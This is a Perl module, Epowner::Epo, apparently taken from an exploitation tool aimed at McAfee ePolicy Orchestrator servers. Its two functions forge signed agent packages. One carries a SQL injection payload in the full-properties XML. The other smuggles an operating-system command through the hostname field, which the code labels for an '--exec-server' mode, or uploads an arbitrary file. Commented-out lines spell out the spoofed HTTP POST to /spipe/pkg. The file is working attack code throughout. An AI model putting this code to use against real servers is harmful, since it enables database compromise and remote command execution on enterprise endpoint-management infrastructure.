package Epowner::Epo;

use MIME::Base64;

use strict;
use warnings;




#====================================================================
# FUNCTION: Common : Generate HTTP Request
#====================================================================
sub mode_common_generate_fullprops_request{
	
	my $this = shift;
	my $sqli = shift;

	# build data
	print "      [+] Generating data structures\n" if $this->{verbose};
        $this->build_struct_fullprops_header1();
        $this->build_struct_fullprops_header2();
        $this->build_struct_fullprops_props($sqli);


	# Compressing FULL Properties XML
	#====================================================================
	print "      [+] Compressing FullProps XML\n" if $this->{verbose};
	my $data_compressed  = compress_deflate($this->{props_xml});


	# Updating various fields in binary_header1
	#====================================================================
	print "      [+] Updating various fields in binary_header1\n"  if $this->{verbose};

	# Update HEADER_LEN in "binary_header1" (little-endian)
	my $final_header_len = pack("V", length($this->{binary_header1}) + length($this->{binary_header2}));
	$this->{binary_header1} =~ s/WWWW/$final_header_len/;

	# Update DATA_LEN in "binary_header1" (little-endian)
	my $final_data_len = pack("V", length($data_compressed));
	$this->{binary_header1} =~ s/ZZZZ/$final_data_len/;


	# XORing binary_header1
	#====================================================================
	print "      [+] XORing binary_header1\n"  if $this->{verbose};
	# XOR post_binary_header1 (because it's fun ?)
	my $binary_header1_xored = xor_str($this->{binary_header1}, 0xaa);



	# Generating DSA Signature
	#====================================================================
	print "      [+] Generating DSA Signature\n" if $this->{verbose};
	my $signature = dsa_sign(
			$this->{binary_header1} . $this->{binary_header2} . $data_compressed,	# to sign
			$this->{dsa_agent}							# dsa object
		);


	# Building final HTTP POST request
	#====================================================================
	print "      [+] Building final HTTP POST request\n" if $this->{verbose};
	# Final binary package
	my $post_data=
	        $binary_header1_xored .
		$this->{binary_header2} .
		$data_compressed .
		$signature;


	return $post_data;


	# Final HTTP request
#	my $http_req =
#	        "POST /spipe/pkg?AgentGuid=" .$this->{agent_guid} . "&Source=Agent_3.0.0 HTTP/1.1\r\n" .
#        	"User-Agent: Mozilla/4.0 (compatible; SPIPE/3.0; Windows)\r\n" .
#	        "Accept: application/octet-stream\r\n" .
#	        "Accept-Language: en-us\r\n" .
#	        "Host: " . $this->{server_host} . "\r\n" .
#	        "Content-Type: application/octet-stream\r\n" .
#	        "Content-Length: " . length($binary_struct) . "\r\n" .
#	        "\r\n" .
#	        $binary_struct;
#
#	return $http_req;
}



#====================================================================
# FUNCTION: Common : Generate Event HTTP Request
#====================================================================
sub mode_common_generate_event_request{
	
	my $this = shift;
	my $event_hostname 	= shift || $this->{agent_hostname}; # hostname can be used during --exec-server , to pass the os command. Max length: 266 chars 
	my $event_dest_filename = shift || undef;		    # used for uploading file (dest filename)
	my $event_xml_content   = shift || undef;		    # used for uploading file (content)

	# build data
	print "      [+] Generating data structures\n" if $this->{verbose};

        $this->build_struct_event_header1();
        $this->build_struct_event_header2();
        $this->build_struct_event_event($event_hostname, $event_dest_filename, $event_xml_content);


	# Compressing FULL Properties XML
	#====================================================================
	print "      [+] Compressing Event XML\n" if $this->{verbose};
	my $data_compressed  = compress_deflate($this->{event_xml});


	# Updating various fields in binary_header1
	#====================================================================
	print "      [+] Updating various fields in binary_header1\n"  if $this->{verbose};

	# Update HEADER_LEN in "binary_header1" (little-endian)
	my $final_header_len = pack("V", length($this->{binary_header1}) + length($this->{binary_header2}));
	$this->{binary_header1} =~ s/WWWW/$final_header_len/;

	# Update DATA_LEN in "binary_header1" (little-endian)
	my $final_data_len = pack("V", length($data_compressed));
	$this->{binary_header1} =~ s/ZZZZ/$final_data_len/;


	# XORing binary_header1
	#====================================================================
	print "      [+] XORing binary_header1\n"  if $this->{verbose};
	# XOR post_binary_header1 (because it's fun ?)
	my $binary_header1_xored = xor_str($this->{binary_header1}, 0xaa);



	# Generating DSA Signature
	#====================================================================
	print "      [+] Generating DSA Signature\n" if $this->{verbose};
	my $signature = dsa_sign(
		$this->{binary_header1} . $this->{binary_header2} . $data_compressed ,	# to sign
		$this->{dsa_agent}							# dsa object
	);



	# Building final HTTP POST request
	#====================================================================
	print "      [+] Building final HTTP POST request\n" if $this->{verbose};
	# Final binary package
	my $post_data=
	        $binary_header1_xored .
		$this->{binary_header2} .
		$data_compressed .
		$signature;

	return $post_data;

	# Final HTTP request
#	my $http_req =
#	        "POST /spipe/pkg?AgentGuid=" .$this->{agent_guid} . "&Source=Agent_3.0.0 HTTP/1.1\r\n" .
#        	"User-Agent: Mozilla/4.0 (compatible; SPIPE/3.0; Windows)\r\n" .
#	        "Accept: application/octet-stream\r\n" .
#	        "Accept-Language: en-us\r\n" .
#	        "Host: " . $this->{server_host} . "\r\n" .
#	        "Content-Type: application/octet-stream\r\n" .
#	        "Content-Length: " . length($binary_struct) . "\r\n" .
#	        "\r\n" .
#	        $binary_struct;
#
#	return $http_req;
}



1;
